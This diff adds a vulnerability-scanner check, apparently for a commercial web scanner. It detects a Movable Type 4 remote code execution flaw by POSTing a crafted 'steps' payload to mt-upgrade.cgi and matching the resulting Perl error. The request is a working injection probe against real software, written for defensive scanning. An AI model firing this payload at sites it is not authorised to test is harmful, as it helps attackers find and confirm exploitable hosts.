@@ -1,0 +1,50 @@
+#include helpers.inc;
+#include classMatches.inc;
+// **************************************************************************************							 
+function alert(fname, matchedText)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile(fname);
+	ri.affects = "Web Server";
+	ri.alertPath = "Scripts/" + fname; 	
+		
+	ri.setHttpInfo(lastJob);	
+	
+	if (matchedText) 
+		ri.Details =  ri.Details + "[break]Pattern found: [pre][blue]" + matchedText + "[/blue][/pre]";	
+	
+	addHTTPJobToCrawler(lastJob, 1, 1);
+	AddReportItem(ri);	
+}							 
+// **************************************************************************************							 
+function vulnerable(baseURI)
+{
+	lastJob = new THTTPJob();
+		
+	lastJob.url = scanURL;
+	lastJob.addCookies = false;
+	lastJob.verb = 'POST';
+	lastJob.URI = baseURI + "mt-upgrade.cgi";
+	lastJob.request.body = '__mode=run_actions&installing=1&steps=[["core_drop_meta_for_table","class","0hZXPb4TaN"]]';
+	lastJob.request.addHeader('Content-type', 'application/x-www-form-urlencoded', true);
+	lastJob.execute();	
+    //trace(lastJob.response.body);
+	if (!lastJob.wasError && lastJob.response.msg2 == 200 && lastJob.response.body.indexOf('Can\'t locate object method \\"dbi_driver\\" via package \\"0hZXPb4TaN\\" at ') !=-1)
+	{
+		return true;
+	}	
+	
+	return false;
+}
+// **************************************************************************************	
+function startTesting()
+{
+	if (vulnerable("/mt/") || vulnerable("/cgi/mt/")) {
+        //trace('vuln');     
+        alert('Movable_Type_4_RCE.xml', 'Can\'t locate object method \\"dbi_driver\\" via package \\"0hZXPb4TaN\\" at ');    
+    }
+}
+/***********************************************************************************/
+/* main entry point */
+var lastJob = null;
+startTesting();
